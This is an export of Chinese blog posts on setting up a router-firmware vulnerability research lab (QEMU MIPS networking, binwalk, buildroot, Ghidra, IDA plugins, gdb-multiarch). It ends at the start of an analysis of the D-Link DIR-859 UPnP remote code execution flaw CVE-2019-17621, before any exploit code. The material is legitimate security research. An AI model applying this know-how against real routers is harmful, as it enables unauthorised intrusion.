route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.0.254</code></pre>
<p>永久性操作，启动时自动配置。</p>
<p>在之前的文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>有提到在 /etc/network/interfaces 文件中配置网桥br0。</p>
<pre class=" language-sh"><code class="language-sh">auto lo # linux中的回环网卡
iface lo inet loopback
auto ens33 # ubuntu16.04上网网卡
iface ens33 inet manual #其实可以设置为dhcp启动不影响
up ifconfig ens33 0.0.0.0 up
auto br0 #增加网桥
iface br0 inet dhcp #网桥的IP地址从dhcp服务器获得
  bridge_ports ens33 #网桥
  bridge_maxwait 0</code></pre>
</li>
<li><p>配置TAP设备作为网桥br0的另一端的操作：</p>
<p>可以把一下命令也写/etc/network/interfaces文件中。 </p>
<pre class=" language-sh"><code class="language-sh">tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问
brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口
ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口
brctl showstp br0                   # 显示 br0 的各个接口</code></pre>
<p>也可以在/etc/qemu-ifup（qemu启动时会运行的文件）中添加命令：</p>
<pre class=" language-sh"><code class="language-sh">#! /bin/sh
echo "Executing /etc/qemu-ifup"
echo "bridge networking"
echo "Bringing up $1 for bridge mode" #$1一般指tap0
sudo /sbin/ifconfig $1 0.0.0.0 promisc up #启用tap0接口
echo "Adding $1 to br0"
sudo /sbin/brctl addif br0 $1 #在网桥中增加tap0接口
sleep 3</code></pre>
</li>
<li><p>利用qemu系统模式启动镜像，指定网络连接模式是 TAP 即可。 </p>
<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
<p>参数含义：-net nic 表示希望 QEMU 在虚拟机中创建一张虚拟网卡，-net tap 表示连接类型为 TAP。默认选择tap0以及启动调用脚本 /etc/qemu-ifup。</p>
<pre class=" language-sh"><code class="language-sh">-net tap,ifname=tap0,script=no,downscript=no</code></pre>
<p>可以更具体指定网卡接口名称(就是刚才创建的 tap0，相当于把虚拟机接入网桥)。script 和 downscript 两个选项的作用是告诉 QEMU 在启动系统的时候是否调用脚本自动配置网络环境，如果这两个选项为空，那么 QEMU 启动和退出时会自动选择第一个不存在的 tap 接口(通常是 tap0)为参数，调用脚本 /etc/qemu-ifup 和 /etc/qemu-ifdown。</p>
</li>
<li><p>在ubuntu16.04上演示：</p>
<p>在 /etc/network/interfaces 文件中配置网桥br0，在/etc/qemu-ifup中配置tap0。</p>
<p>在qemu启动虚拟机之前，<code>ifconfig -a</code>查看网卡信息，此时已经有网桥br0了。</p>
<p><img src="ifconfig.png" alt=""> </p>
<p>启动qemu时，自动调用/etc/qemu-ifup，启用tap0网卡并接入网桥中。这时<code>ifconfig</code>可以看见多了tap0网卡。</p>
<p><img src="%E5%90%AF%E5%8A%A8qemu.png" alt=""></p>
<p>使用root/root登入qemu虚拟机<code>ifconfig</code>查看网卡信息。</p>
<p><img src="qemu_ifconfig.png" alt=""></p>
<p>发现eth1网卡的ip地址为192.168.0.101，<code>cat /etc/network/interfaces</code>发现eth1是通过dhcp服务器分配ip地址的。</p>
<p><img src="qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE.png" alt=""></p>
<p><code>ping www.baidu.com</code>能够ping通说明配置成功了。</p>
<p><img src="ping%E7%99%BE%E5%BA%A6.png" alt=""></p>
<p><code>brctl show br0</code>查看br0网桥列表，<code>brctl showstp br0</code>查看br0网桥的各接口信息。可以看到网桥连着两块网卡tap0和ens33。</p>
<p><img src="%E7%BD%91%E6%A1%A5%E5%90%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF.png" alt=""></p>
</li>
</ol>
<h1 id="Firmadyne中配置网卡部分"><a href="#Firmadyne中配置网卡部分" class="headerlink" title="Firmadyne中配置网卡部分"></a>Firmadyne中配置网卡部分</h1><p>文件：/firmadyne/scratch/x/run.sh(x是对应固件的编号，如果下载了schema并导入了postgresql数据库的话，则是按照数据库中的编号)</p>
<pre class=" language-sh"><code class="language-sh">···
#配置网卡过程
TAPDEV_0=tap${IID}_0
HOSTNETDEV_0=${TAPDEV_0}
echo "Creating TAP device ${TAPDEV_0}..."
sudo tunctl -t ${TAPDEV_0} -u ${USER}

echo "Initializing VLAN..."
HOSTNETDEV_0=${TAPDEV_0}.1
sudo ip link add link ${TAPDEV_0} name ${HOSTNETDEV_0} type vlan id 1
sudo ip link set ${TAPDEV_0} up

echo "Bringing up TAP device..."
sudo ip link set ${HOSTNETDEV_0} up
sudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0}

echo "Adding route to 192.168.0.1..."
sudo ip route add 192.168.0.1 via 192.168.0.1 dev ${HOSTNETDEV_0}
···

# 利用qemu系统模式进行仿真
 ${QEMU} -m 256 -M ${QEMU_MACHINE} -kernel ${KERNEL} \
    -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0" \
    -nographic \
    -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net0 -netdev socket,id=net1,listen=:2001 -device e1000,netdev=net1 -netdev socket,id=net2,listen=:2002 -device e1000,netdev=net2 -netdev socket,id=net3,listen=:2003 -device e1000,netdev=net3 | tee ${WORK_DIR}/qemu.final.serial.log</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>qemu</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>路由器漏洞挖掘环境搭建</title>
    <url>/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从2019年5月开始决定把物联网漏洞挖掘作为自己的课题开始，到现在也断断续续调试分析过一些漏洞，感觉一路心酸历程啊！确实踩了很多坑，恰逢最近重新搭建环境，值此良机，整理下搭建过程。</p>
<p>我使用的是ubuntu16.04 LTS虚拟机。</p>
<h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>因为利用apt-get安装binwalk会缺少很多依赖项所以还是建议根据 <a href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md" target="_blank" rel="noopener">https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md</a> </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
# 对于Debian/Ubuntu的用户而言，很多依赖项都可以通过deps.sh安装
sudo ./deps.sh
sudo python ./setup.py install</code></pre>
<p> 下载源代码自己编译 </p>
<pre class=" language-shell"><code class="language-shell">sudo apt-get install git build-essential autoconfsudo 
git clone https://github.com/devttys0/binwalk.git
sudo apt-get install libqt4-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip
sudo pip install pyqtgraph
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
git clone https://github.com/devttys0/sasquatchcd sasquatch && sudo make && sudo make install
sudo python setup.py install</code></pre>
<h1 id="安装sasquatch"><a href="#安装sasquatch" class="headerlink" title="安装sasquatch"></a>安装sasquatch</h1><p>一般现在binwalk完全安装时会自动带上这个sasquatch，输入这三条命令就可以了 </p>
<pre class=" language-text"><code class="language-text">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch && sudo make && sudo make install</code></pre>
<h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><h2 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h2><p>下面安装qemu的步骤参照知世师傅的<a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">博客内容</a></p>
<ol>
<li>直接安装qemu，直接使用系统提供的版本，ubuntu16.04一般是qemu2.5</li>
</ol>
<pre class=" language-shell"><code class="language-shell">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo apt-get install qemu 
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system</code></pre>
<ol start="2">
<li><p>自己编译</p>
<ol>
<li><p>git </p>
<pre class=" language-sh"><code class="language-sh">git clone git://git.qqmu-project.org/qemu.git/qemu.git
git submodule update --init pixman
git submodule update --init dtc
sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo ./configure --static && sudo make -j8 && sudo make install
注: 使用configure 使用static参数的时候,依赖可能会根据不同环境导致依赖缺失,可以根据报错来解决依赖问题
</code></pre>
</li>
<li><p>wget</p>
<p> 可根据需求不同来选择不同的版本 </p>
<pre class=" language-sh"><code class="language-sh">sudo apt install libglib2.0-dev libgcrypt20-dev autoconf automake libtool 
sudo apt-get install libglib2.0 libglib2.0-dev
sudo apt install -y pkg-config
sudo apt install -y libpixman-1-dev
sudo apt install -y libfdt-dev
sudo apt install libsdl2-dev  
sudo apt install libsnappy-dev
sudo apt install libgtk-3-dev
sudo apt install libjpeg-turbo8-dev
sudo apt install libcurl4-openssl-dev
sudo apt install libspice-server-dev
sudo arm-softmmu
wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
sudo ./configure --target-list=arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list=alsa,pa
sudo make -j8
sudo make install</code></pre>
</li>
<li><p>这里贴出官方的安装教程</p>
<ol>
<li><p>To download and build QEMU 4.1.0:</p>
<pre class=" language-shell"><code class="language-shell">wget https://download.qemu.org/qemu-4.1.0.tar.xz
tar xvJf qemu-4.1.0.tar.xz
cd qemu-4.1.0
./configure
make</code></pre>
</li>
<li><p>To download and build QEMU from git:</p>
<pre class=" language-shell"><code class="language-shell">git clone https://git.qemu.org/git/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make</code></pre>
</li>
<li><p>Debian/Ubuntu:</p>
<pre class=" language-sh"><code class="language-sh">apt-get install qemu</code></pre>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="qemu网络配置"><a href="#qemu网络配置" class="headerlink" title="qemu网络配置"></a>qemu网络配置</h2><pre class=" language-shell"><code class="language-shell">sudo apt-get install bridge-utils #虚拟网桥工具
sudo apt-get install uml-utilities # UML（User-mode linux）工具</code></pre>
<p><code>sudo vi /etc/network/interfaces</code></p>
<p>写入下面的内容：</p>
<pre class=" language-shell"><code class="language-shell"># interfaces(5) file used by ifup(8) and ifdown(8)
auto lo
iface lo inet loopback
auto ens33
iface ens33 inet manual
up ifconfig ens33 0.0.0.0 up
auto br0
iface br0 inet dhcp
  bridge_ports ens33
  bridge_maxwait 0</code></pre>
<p>改完之后要重启网卡才能生效：</p>
<p><code>sudo /etc/init.d/networking  restart</code></p>
<p> 配置 qemu 虚拟机的网卡信息： </p>
<p><code>sudo vi /etc/qemu-ifup</code></p>
<p> 将原来的内容注释，换成下面的内容： </p>
<pre class=" language-shell"><code class="language-shell">#! /bin/sh
echo "Executing /etc/qemu-ifup"
echo "bridge networking"
echo "Bringing up $1 for bridge mode"
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0"
sudo /sbin/brctl addif br0 $1
sleep 3</code></pre>
<h2 id="qemu-mips对应包下载"><a href="#qemu-mips对应包下载" class="headerlink" title="qemu-mips对应包下载"></a>qemu-mips对应包下载</h2><p>从 <a href="https://people.debian.org/~aurel32/qemu/mips/下载对应的debian" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/mips/下载对应的debian</a> mips qemu镜像  </p>
<p><img src="mips_qemu.png" alt=""></p>
<p>选择debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta.   </p>
<p>使用qemu系统模式加载之前下载的内核：qemu-system-mips对于mips的镜像。</p>
<pre class=" language-shell"><code class="language-shell">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
<p>可以看到一个qemu虚拟机，用root/root登录进去：   </p>
<p><img src="qemu_mips%E8%99%9A%E6%8B%9F%E6%9C%BA.png" alt=""></p>
<p><code>nano /etc/network/interfaces</code>将网卡eth0改为eth1：  </p>
<p><code>/etc/init.d/networking restart</code>看是否配置成功，不然可以重启qemu试试是否自动配置好了eth1的网卡信息。 </p>
<p>进去虚拟机之后，如果发现只有网卡的其他信息、没有 IP 地址，<strong>可以手动配置一下 eth1 网卡的 IP</strong>：</p>
<pre class=" language-sh"><code class="language-sh">ifconfig eth1 192.168.91.130/24 #跟宿主机在同一个网段内</code></pre>
<p>之后ping一下外面的主机看看是否联通。宿主机也可以通过ssh <a href="mailto:root@192.168.91.130">root@192.168.91.130</a>远程登陆进去。</p>
<p>以后的文章可能会细讲，qemu的网络配置和通信。</p>
<h1 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h1><ol>
<li><p>下载buildroot安装包（我这里选了一个2019.02版本）</p>
<pre class=" language-shell"><code class="language-shell">wget http://buildroot.net/downloads/buildroot-2019.02.tar.gz
或者直接从http://buildroot.net/downloads/下载</code></pre>
</li>
<li><p>解压安装包</p>
<pre class=" language-shell"><code class="language-shell">tar -zxvf buildroot-2019.02.tar.gz</code></pre>
</li>
<li><p>进入安装包，配置   </p>
<pre class=" language-shell"><code class="language-shell">cd buildroot-2019.02 && make clean && make menuconfig</code></pre>
</li>
<li><p>进入配置界面</p>
<p><img src="%E9%85%8D%E7%BD%AE%E7%95%8C%E9%9D%A2.png" alt=""></p>
<p>首先根据想要调试的目标架构进行配置Target options，我因为要调试mips小端架构，所以选择如下： </p>
<p><img src="target_options.png" alt="">  </p>
<p>Build options选择默认就好，进入Toolchain进入配置</p>
<p>C library选择uClibc-ng，因为二进制文件是使用此库编译的，所以大多数设备都是用此C库</p>
<p><img src="c_library.png" alt=""></p>
<p>其中的kernel Headers根据查看ubantu操作系统内核进行选择 </p>
<p><code>uname -a</code></p>
<p><img src="uname_a.png" alt=""></p>
<p>选择Manually specified然后找到4.15.x并选择</p>
<p><img src="kernel_head.png" alt=""></p>
<p>gcc 版本选择</p>
<p><code>gcc -v</code></p>
<p><img src="gcc-.png" alt=""></p>
<p>选择gcc 5.x   </p>
<p><img src="gcc-%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后启用“为主机启用交叉编译的gdb”按Y选中,括号内会有*号。   </p>
<p><img src="gdb%E9%80%89%E6%8B%A9.png" alt=""></p>
<p>最后<code>sudo make -j8</code> </p>
</li>
<li><p>配置环境变量</p>
<p>在/etc/profile文件中加入</p>
<p><code>export PATH=$PATH:/home/yourname/buildroot-2019.02.2/output/host/bin</code></p>
<p>最后<code>source /etc/profile</code></p>
</li>
<li><p>检验是否能编译生成mipsel文件</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"demo\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>利用<code>mipsel-linux-gcc demo.c -static -o demo</code>得到是小端文件，并且能直接运行。</p>
<pre class=" language-shell"><code class="language-shell"> ~/Desktop/IoT :  mipsel-linux-gcc demo.c -static -o demo
 ~/Desktop/IoT :  file demo
demo: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></pre>
<p>如果没有加<code>-static</code>将需要动态链接库</p>
<p><img src="%E9%9C%80%E8%A6%81%E9%93%BE%E6%8E%A5%E5%BA%93.png" alt=""></p>
<p>这时我们只需要找到该库，使用<code>qemu-mipsel -L /Your_Path/buildroot/output/target/ hello</code>即可运行。 </p>
</li>
</ol>
<h1 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h1><p> Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。  该反汇编工具类似于我们常用的IDA，不过其基于JAVA开发，是一款适用于Windows、Mac和Linux的跨平台反汇编工具，用户还可以使用Java或Python开发自己的Ghidra插件或者脚本。 </p>
<h2 id="安装条件"><a href="#安装条件" class="headerlink" title="安装条件"></a>安装条件</h2><p>硬件条件:4GB内存;1GB硬盘空间</p>
<p>软件条件:Java 11+</p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>百度盘下载地址：<a href="https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zHWilk5NiTuzDItQhI8nnQ</a> （提取码 ：8upz） </p>
<p>github地址： <a href="https://github.com/NationalSecurityAgency/Ghidra" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency/Ghidra</a> </p>
<p>项目主页： <a href="https://Ghidra-sre.org" target="_blank" rel="noopener">https://Ghidra-sre.org</a> 可以直接从上面下载最新的ghidra</p>
<p><a href="https://www.secrss.com/articles/8829" target="_blank" rel="noopener">NSA开源逆向工具Ghidra入门使用教程</a></p>
<p>在Ubuntu16.04中同样可以建立一个软链接进行快捷键启动。</p>
<pre class=" language-sh"><code class="language-sh">ln -s /home/yourname/project/ghidra_9.1.2_PUBLIC_20200212/ghidra_9.1.2_PUBLIC/ghidraRun /usr/bin/ghidra</code></pre>
<h2 id="Ghidra插件使用"><a href="#Ghidra插件使用" class="headerlink" title="Ghidra插件使用"></a>Ghidra插件使用</h2><p>可以学习Freebuf上平安银河实验室提供的免费<a href="https://live.freebuf.com/detail/719e1138a016a5bffbfe0daeb4533b4f" target="_blank" rel="noopener">公开课</a>，然后其中的插件可以参照平安银河实验室写的Ghidra_scripts<a href="https://github.com/PAGalaxyLab/ghidra_scripts" target="_blank" rel="noopener">https://github.com/PAGalaxyLab/ghidra_scripts</a> </p>
<h1 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h1><p>Firmadyne是一个基于qemu的Linux嵌入式系统自动仿真工具。利用它可以主要可以模拟路由器固件的运行。它拥有自己自己预编译好的mips架构Linux内核。</p>
<p>github传送门： <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a> 里面有详细的安装和使用说明。</p>
<p>也可以参考这篇帖子进行安装使用： <a href="https://chuansongme.com/n/1009525252762" target="_blank" rel="noopener">https://chuansongme.com/n/1009525252762</a> </p>
<p>到此环境差不多安装完了。</p>
<h1 id="IDA及其插件"><a href="#IDA及其插件" class="headerlink" title="IDA及其插件"></a>IDA及其插件</h1><p>如果想把IDA直接安装在linux中需要安装wine， 工作目录在~/.wine。 </p>
<h2 id="wine安装和使用"><a href="#wine安装和使用" class="headerlink" title="wine安装和使用"></a>wine安装和使用</h2><pre class=" language-sh"><code class="language-sh">sudo apt-get install wine</code></pre>
<h2 id="wine中安装使用IDA"><a href="#wine中安装使用IDA" class="headerlink" title="wine中安装使用IDA"></a>wine中安装使用IDA</h2><p>直接安装或者将安装好的IDA整个包拖进ubuntu16.04，然后用<code>wine idaq.exe</code>就能启动起来，但是会出现缺少python27.dll</p>
<pre class=" language-text"><code class="language-text">module:import_dll Loading library python27.dll (which is needed by L"Z:\\home\\anciety\\ida\\plugins\\python.plw") failed (error c000007b).</code></pre>
<p>在宿主机找到该文件并放在IDA的根目录下，还是出现同样的问题，网上还说从<a href="https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython" target="_blank" rel="noopener">https://www.dllme.com/dll/files/python27_dll.html下载一个python27.dll放在IDA根目录下，但是之后再启动，会出现`IDAPython</a>: importing “site” failed<code>问题， 解决方法就是需要设置一个环境变量，如果在</code>/usr/bin`下写了一个脚本来启动ida，那么解决方法比较简单，也不会影响linux，否则如果直接设置环境变量会影响linux的python运行。 </p>
<p>脚本:</p>
<pre class=" language-shell"><code class="language-shell">#!/bin/bash
export PYTHONPATH=/usr/lib/python2.7 && wine yourpath/idaq.exe</code></pre>
<p>如果上面方法还是报错，网上找到解决方案是在wine里面重新安装python2.7。</p>
<pre class=" language-sh"><code class="language-sh">curl -O https://www.python.org/ftp/python/2.7.15/python-2.7.15.msi
wine msiexec /i python-2.7.15.msi</code></pre>
<p>解决上述问题之后，写一个快捷命令启动脚本idaq</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
wine yourpath/idaq.exe</code></pre>
<p>之后建立一个软连接以方便在任何窗口输入idaq迅速启动</p>
<pre class=" language-sh"><code class="language-sh">ln -s pathof上面的快捷脚本 /usr/bin/idaq</code></pre>
<p>同样给idaq64.exe建立一个启动脚本和软连接。</p>
<h2 id="安装keypatch-py插件"><a href="#安装keypatch-py插件" class="headerlink" title="安装keypatch.py插件"></a>安装keypatch.py插件</h2><p>主要问题是安装keystone, 在<a href="http://www.keystone-engine.org/download/" target="_blank" rel="noopener">http://www.keystone-engine.org/download/</a> 下载32位keystone-0.9.1-python-win32.msi下载并安装，应该能使用keypatch.py插件，但是有时还是会爆出缺少msvcp120.dll和msvcr120.dll动态链接库的问题，直接在主机找到并复制到IDA根目录就能解决。</p>
<p>还有很多运行错误包括缺少DLL都可以从本机找到放进IDA根目录解决，其他运行错误根据提示进行相应的解决。</p>
<h2 id="安装mipsrop等插件"><a href="#安装mipsrop等插件" class="headerlink" title="安装mipsrop等插件"></a>安装mipsrop等插件</h2><p>安装mipsrop插件，以方便IDA调试，现在支持IDA7.0+</p>
<pre class=" language-text"><code class="language-text">https://github.com/devttys0/ida/tree/master/plugins/mipsrop</code></pre>
<p>把下载的ida/plugins目录下所有后缀为:,py“d的文件复制到IDA pro插件目录：</p>
<pre class=" language-sh"><code class="language-sh">sudo cp –r `find /home/yale/a/ida/plugins –iname *.py` /home/yale/ida/ida/plugins/</code></pre>
<p>将scrpit复制到idapro根目录下</p>
<pre class=" language-text"><code class="language-text">sudo mkdir /home/yale/ida/ida/plugins/scripts
sudo cp –r ida/scripts ida/scripts/</code></pre>
<p>下载之后放在ida的plugins中，我本机用的IDA7.1，wine虚拟机用的IDA6.8都能正常使用</p>
<p><img src="mipsrop.png" alt=""></p>
<p>也有师傅改了之前的mipsrop以支持IDA6.x和IDA7.x</p>
<pre class=" language-text"><code class="language-text">https://github.com/fuzzywalls/ida</code></pre>
<h1 id="调试工具gdb-multiarch、pwndbg"><a href="#调试工具gdb-multiarch、pwndbg" class="headerlink" title="调试工具gdb-multiarch、pwndbg"></a>调试工具gdb-multiarch、pwndbg</h1><p>首先是安装pwndbg，peda对于mips的动态调试没有太好的支持。pwndbg的安装命令： </p>
<pre class=" language-shell"><code class="language-shell">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh</code></pre>
<p>接着是安装<code>gdb-multiarch</code>，安装命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo apt-get install gdb-multiarch</code></pre>
<p>安装完毕后，整个远程动态调试的过程为：</p>
<ol>
<li>使用命令<code>qemu-mipsel -g 1234 -L /Your_Path/buildroot/output/target/ demo将程序运行起来，</code>-g 1234`的意思表示为监听端口1234，用于远程调试。</li>
<li>使用<code>gdb-multiarch ./demo</code>来开启gdb。</li>
<li>进入gdb后，使用命令<code>target remote 127.0.0.1:1234</code>，即开始调试程序。</li>
</ol>
<p>用gdb-multiarch调试，相较于ida远程调试来说，对于用习惯了gdb调试的人来说应该会方便不少，而且还有pwndbg的支持。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://xz.aliyun.com/t/3826" target="_blank" rel="noopener">https://xz.aliyun.com/t/3826</a> </p>
<p> <a href="https://xz.aliyun.com/t/462" target="_blank" rel="noopener">https://xz.aliyun.com/t/462</a> </p>
<p><a href="[https://www.vulbox.com/knowledge/detail/?id=35%20%20](https://www.vulbox.com/knowledge/detail/?id=35">路由器固件安全分析技术（一）</a> )</p>
<p><a href="[https://nightrainy.github.io/2019/11/04/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://nightrainy.github.io/2019/11/04/路由器破解初探之环境搭建/)">路由器破解初探之环境搭建</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link RCE CVE-2019-17621分析</title>
    <url>/2020/03/29/d-link-rce-cve-2019-17621-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p> The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network. </p>
</blockquote>
<p>这是CVE官网对于CVE-2019-17621的描述，从描述中可以看出漏洞出现在处理UPnP订阅请求的代码中，漏洞目标是D-Link DIR-859路由器，固件版本为1.06b01 Beta01, 1.05，该漏洞是无需认证的远程代码执行漏洞（一般处于局域网中）。</p>
<p>根据研究人员Miguel Mendez Z.的介绍，该漏洞还影响以下产品：</p>
<p><img src="Affected_product.png" alt=""></p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
<thead>
<tr>
<th></th>
<th>测试环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Ubuntu 16.04 LTS</td>
<td></td>
</tr>
<tr>
<td>系统仿真工具</td>
<td>Firmadyne</td>
<td></td>
</tr>
<tr>
<td>反编译工具</td>
<td>Ghidra</td>
<td></td>
</tr>
<tr>
<td>分析固件</td>
<td>DIR-859 1.05版本</td>
<td><a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip">ftp://ftp2.dlink.com/PRODUCTS/DIR-859/DIR-859_REVA_FIRMWARE_v1.05B03.zip</a></td>
</tr>
</tbody></table>
<p>Firmadyne是一款自动化和可裁剪的嵌入式Linux系统固件分析框架，它支持系统固件逆向QEMU嵌入式系统模拟执行，使用其可模拟执行路由器固件，安装和使用方法详见<a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a>。之后的文章会可能会对该工具进一步介绍。</p>
<p>Ghidra是由美国国家安全局（NSA）研究部门开发的软件逆向工程（SRE）套件，用于支持网络安全任务。 Ghidra具有反编译功能，查看、定位反编译后的代码相较于IDA有优势。 针对MIPS架构代码的反编译功能较好。</p>
<h1 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h1><p>该漏洞设计upnp，那么简单了解下upnp协议。</p>
<p>随着越来越多的设备联入网络，对于共享设备以及共享设备提供的资源和服务的需求也越来越强烈，透明的访问各种联入网络的资源也成为了一种非常复杂的任务。因此，在1999年，Microsoft公司开始大张旗鼓地宣传下一代即插即用技术–通用即插即用（ Universal Plug and Play，简称UPnP）。UPnP实际上是扩展了传统单机的设备和计算机系统的概念，在”零配置”的前提下提供了连网设备之间的发现、接口声明和其他信息的交换等互动操作功能。Microsoft公司称”UPnP将延伸到家庭中的每一个设备，它会成为个人电脑、应用程序、智能设备集成工作所必需的框架、协议和接口标准”。</p>
